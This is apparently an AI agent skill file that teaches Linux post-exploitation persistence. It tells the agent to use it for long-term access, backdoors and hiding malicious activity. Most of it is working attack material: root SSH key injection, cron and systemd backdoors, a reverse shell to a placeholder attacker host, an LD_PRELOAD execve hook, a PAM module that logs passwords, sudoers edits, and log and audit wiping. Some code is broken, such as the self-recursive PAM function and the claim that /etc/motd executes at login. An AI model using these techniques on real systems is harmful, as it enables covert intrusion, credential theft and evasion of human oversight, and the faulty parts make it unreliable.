---
name: linux-persistence
description: "Linux post-exploitation persistence mechanisms: cron jobs, systemd services, SSH backdoors, LD_PRELOAD rootkits, PAM hijacking. Use when establishing long-term access post-privilege escalation, creating resilient backdoors across system restarts, or hiding malicious activity from process monitoring."
license: MIT
compatibility: "Linux. Bash shell scripts. Requires root for system-wide persistence; user-level techniques available for regular users. Works on modern systemd-based distributions (RHEL 7+, Ubuntu 18.04+, Debian 10+)."
metadata:
  author: AeonDave
  version: "1.0"
---

# Linux Persistence Mechanisms

Post-exploitation persistence: durable, stealthy, rebootable backdoors.

## Quick Start: Fastest Persistence Methods

```bash
# 1. SSH Key Injection (fastest, immediate)
echo "ssh-rsa AAAA..." >> /root/.ssh/authorized_keys

# 2. Cron Job (reliable, simple)
echo "* * * * * /tmp/backdoor.sh" | crontab -

# 3. Systemd Service (survives reboot, persistent)
cat > /etc/systemd/system/backdoor.service << EOF
[Unit]
Description=System Update Service
After=network.target
[Service]
Type=simple
ExecStart=/tmp/backdoor.sh
Restart=always
User=root
[Install]
WantedBy=multi-user.target
EOF
systemctl daemon-reload && systemctl enable backdoor.service
```

---

## Cron-Based Persistence

### 1. Simple Cron Backdoor

```bash
# Add reverse shell to root crontab (every 5 minutes):
(crontab -l 2>/dev/null || true; echo "*/5 * * * * /bin/bash -i >& /dev/tcp/ATTACKER/4444 0>&1") | crontab -

# Or add to crontab directly:
echo "*/5 * * * * /tmp/backdoor.sh" >> /var/spool/cron/crontabs/root
```

### 2. Hidden Cron Job

```bash
# Use whitespace/null bytes to hide from "crontab -l":
# (Advanced, requires custom cron parsing)

# Or simple alternative: legitimate-looking cron name:
echo "*/15 * * * * /usr/local/bin/system-update.sh 2>/dev/null" >> /var/spool/cron/crontabs/root

# Script does both legitimate work + backdoor
```

### 3. User-Level Cron (Less Suspicious)

```bash
# If you compromised a service account (e.g., www-data):
(crontab -l 2>/dev/null || true; echo "*/10 * * * * /tmp/callback.sh") | crontab -

# Less likely to be monitored than root cron
```

### 4. At-Based Scheduling (One-Shot)

```bash
# Schedule command to run once in future:
echo "/tmp/backdoor.sh" | at 2:00 AM tomorrow

# Or repeating via at + script:
echo "echo '/tmp/backdoor.sh' | at 2:00 AM tomorrow" >> /tmp/loop.sh
```

---

## Systemd Service Persistence

### 1. Systemd Service Backdoor

```bash
# Create service file:
cat > /etc/systemd/system/system-update.service << 'EOF'
[Unit]
Description=System Update Service
After=network.target
Wants=network-online.target

[Service]
Type=simple
User=root
ExecStart=/tmp/backdoor.sh
Restart=always
RestartSec=10

[Install]
WantedBy=multi-user.target
EOF

# Enable & start:
systemctl daemon-reload
systemctl enable system-update.service
systemctl start system-update.service
```

### 2. Systemd Timer (Scheduled Execution)

```bash
# Service file (same as above)

# Timer file:
cat > /etc/systemd/system/system-update.timer << 'EOF'
[Unit]
Description=System Update Timer
Requires=system-update.service

[Timer]
OnBootSec=2min
OnUnitActiveSec=5min
AccuracySec=1s

[Install]
WantedBy=timers.target
EOF

# Enable:
systemctl daemon-reload
systemctl enable system-update.timer
systemctl start system-update.timer
```

### 3. Oneshot Service (Run Once at Boot)

```bash
cat > /etc/systemd/system/setup.service << 'EOF'
[Unit]
Description=System Setup
After=network.target

[Service]
Type=oneshot
ExecStart=/tmp/setup.sh
User=root

[Install]
WantedBy=multi-user.target
EOF

systemctl daemon-reload && systemctl enable setup.service
```

### 4. Detect & Verify Service

```bash
# List all services:
systemctl list-units --type=service

# Check specific service:
systemctl status backdoor.service

# View service file:
cat /etc/systemd/system/backdoor.service

# View logs:
journalctl -u backdoor.service -f
```

---

## SSH-Based Persistence

### 1. SSH Authorized Keys (Immediate Access)

```bash
# Generate key (on attacker machine):
ssh-keygen -t ed25519 -f attacker_key -N ""

# On compromised machine (as root):
cat >> /root/.ssh/authorized_keys << 'EOF'
ssh-ed25519 AAAAC3NzaC1lZDI1NTE5 attacker@home
EOF

# Ensure permissions:
chmod 700 /root/.ssh
chmod 600 /root/.ssh/authorized_keys

# SSH back in:
ssh -i attacker_key root@target
```

### 2. SSH Forced Command (Limited Shell)

```bash
# Restrict backdoor key to only reverse shell:
cat >> /root/.ssh/authorized_keys << 'EOF'
command="/bin/bash -i" ssh-ed25519 AAAAC3NzaC1lZDI1NTE5 attacker@home
EOF

# Now key can ONLY trigger reverse shell, limiting attacker exposure
```

### 3. SSH Proxy Command (Stealth)

```bash
# Modify user's ~/.ssh/config:
cat >> ~/.ssh/config << 'EOF'
Host internal-prod
    HostName 10.0.0.5
    ProxyCommand ssh attacker@home -W %h:%p
EOF

# Now user's SSH to "internal-prod" proxies through attacker machine
```

### 4. SSH Root Access via Sudo

```bash
# Add to sudoers:
echo "www-data ALL=(ALL) NOPASSWD: /bin/bash" >> /etc/sudoers.d/www-data

# Service account can now sudo bash without password
```

---

## LD_PRELOAD Rootkit Persistence

### 1. Create Malicious Shared Library

```c
// backdoor.c
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <dlfcn.h>
#include <string.h>

typedef int (*execve_t)(const char *pathname, char *const argv[], char *const envp[]);
static execve_t original_execve = NULL;

int execve(const char *pathname, char *const argv[], char *const envp[]) {
    // Load original execve
    if (!original_execve) {
        original_execve = (execve_t) dlsym(RTLD_NEXT, "execve");
    }
    
    // Trigger backdoor on specific command (e.g., ls)
    if (strstr(pathname, "/bin/ls") != NULL) {
        pid_t pid = fork();
        if (pid == 0) {
            execl("/bin/bash", "bash", "-c", "/tmp/callback.sh &", NULL);
            exit(0);
        }
    }
    
    return original_execve(pathname, argv, envp);
}
```

### 2. Compile & Install

```bash
# Compile shared library:
gcc -shared -fPIC -ldl -o /lib/x86_64-linux-gnu/backdoor.so backdoor.c

# Add to LD_PRELOAD (system-wide):
echo "/lib/x86_64-linux-gnu/backdoor.so" >> /etc/ld.so.preload

# Verify:
cat /etc/ld.so.preload
ldd /bin/ls | grep backdoor

# Now EVERY binary loads the backdoor
```

### 3. Hide Backdoor

```bash
# Make library immutable:
chattr +i /lib/x86_64-linux-gnu/backdoor.so

# Hide from ls output:
# (Requires LD_PRELOAD of readdir hook)
```

---

## PAM Hijacking (Credential Harvesting + Backdoor)

### 1. PAM Backdoor Module

```bash
# Create PAM module that logs passwords:
cat > pam_backdoor.c << 'EOF'
#define PAM_SM_AUTH
#include <security/pam_modules.h>
#include <stdio.h>
#include <stdlib.h>
#include <syslog.h>

PAM_EXTERN int pam_sm_authenticate(pam_handle_t *pamh, int flags, int argc, const char **argv) {
    const char *user = NULL;
    const char *passwd = NULL;
    
    pam_get_user(pamh, &user, NULL);
    pam_get_authtok(pamh, PAM_AUTHTOK, &passwd, NULL);
    
    // Log password to file
    FILE *f = fopen("/tmp/.pam_log", "a");
    fprintf(f, "%s:%s\n", user, passwd);
    fclose(f);
    
    // Call original PAM auth
    return pam_sm_authenticate(pamh, flags, argc, argv);
}
EOF

# Compile:
gcc -shared -fPIC -o pam_backdoor.so pam_backdoor.c -lpam

# Install:
cp pam_backdoor.so /lib/x86_64-linux-gnu/security/

# Add to /etc/pam.d/common-auth:
echo "auth optional pam_backdoor.so" >> /etc/pam.d/common-auth

# Now all SSH/sudo passwords logged to /tmp/.pam_log
```

---

## Init Script Persistence (Legacy Systems)

### 1. /etc/init.d Script

```bash
cat > /etc/init.d/system-monitor << 'EOF'
#!/bin/bash
### BEGIN INIT INFO
# Provides:          system-monitor
# Required-Start:    $network
# Required-Stop:     
# Default-Start:     2 3 4 5
# Default-Stop:      
### END INIT INFO

case "$1" in
  start)
    /tmp/backdoor.sh &
    ;;
esac

exit 0
EOF

chmod +x /etc/init.d/system-monitor
update-rc.d system-monitor defaults
```

### 2. /etc/rc.local

```bash
# Add to /etc/rc.local (runs at boot):
echo "/tmp/backdoor.sh &" >> /etc/rc.local
chmod +x /etc/rc.local
```

---

## MOTD (Message of the Day) Backdoor

```bash
# /etc/motd runs when user logs in:
echo -e "\n#!/bin/bash\n/tmp/callback.sh &\n" >> /etc/motd
chmod +x /etc/motd

# Every SSH login triggers callback
```

---

## Bash/Shell Configuration Persistence

### 1. ~/.bashrc / ~/.bash_profile

```bash
# For specific user (low privilege backdoor):
echo "/tmp/backdoor.sh &" >> ~/.bashrc

# Or for all users:
echo "/tmp/backdoor.sh &" >> /etc/bash.bashrc
```

### 2. /etc/profile.d/

```bash
cat > /etc/profile.d/system-update.sh << 'EOF'
#!/bin/bash
/tmp/backdoor.sh &
EOF

chmod +x /etc/profile.d/system-update.sh

# Runs for every login shell
```

---

## Detection Evasion

### 1. File Permissions Obfuscation

```bash
# Make backdoor script appear legitimate:
chmod 755 /tmp/backdoor.sh
touch -t 202201010000 /tmp/backdoor.sh  # Fake timestamp

# Or hide in system directories:
cp /tmp/backdoor.sh /usr/lib/system-update.sh
```

### 2. Log Suppression

```bash
# Clear cron logs:
cat /dev/null > /var/log/cron

# Disable auditd for specific paths:
auditctl -a never,exit -F path=/tmp/backdoor.sh

# Clear bash history:
cat /dev/null > ~/.bash_history
```

### 3. Process Hiding

```bash
# Via LD_PRELOAD (hide process from ps/top):
# (Create custom readdir hook in backdoor.so)

# Or use disown:
(/tmp/backdoor.sh &) &
disown

# Process no longer visible in job list
```

---

## OPSEC Considerations

⚠️ **Detection risks:**

| Method | Detection Risk | TTL |
|---|---|---|
| **SSH Key** | 🔴 High (auth logs) | Forever |
| **Cron** | 🟠 Medium (cron logs) | 1 year (log rotation) |
| **Systemd Service** | 🟠 Medium (systemctl list) | Forever (visible) |
| **LD_PRELOAD** | 🟡 Low (hidden, binary-level) | Until reboot or library removed |
| **PAM Module** | 🟡 Low (authentication level) | Until admin discovers |
| **Shell Config** | 🔴 High (user's ~/.bashrc) | Forever (user shell) |

✅ **Recommendations:**
1. Use **SSH key injection** for immediate access (easiest)
2. Use **cron** for periodic callbacks (requires regular execution)
3. Use **systemd** for persistence across reboots (obvious if discovered)
4. Use **LD_PRELOAD** for stealthy, process-level hiding (most sophisticated)
5. Combine multiple methods for redundancy

❌ **Avoid:**
- Single persistence method (one removal = no access)
- Obvious filenames (/tmp/backdoor.sh)
- Noisy execution patterns (every minute cron)
- Root access required if user-level options available

---

## Integration with Other Tools

| Tool | Use |
|---|---|
| **pwncat** | Auto-adds SSH key + cron backdoor |
| **LinPEAS** | Identifies persistence opportunities (writable cron, sudoers) |
| **ssh-key-scanner** | Finds existing SSH keys for pivoting |
| **linux-exploit-suggester** | Finds kernel exploits for privilege escalation (prerequisite) |

---

## References & Resources

| Resource | Topic |
|---|---|
| `references/` | Detailed exploitation chains, bypass techniques, forensic evasion |
| GTFOBins | Binaries with persistence gadgets |
| HackTricks | Linux persistence techniques & detection evasion |
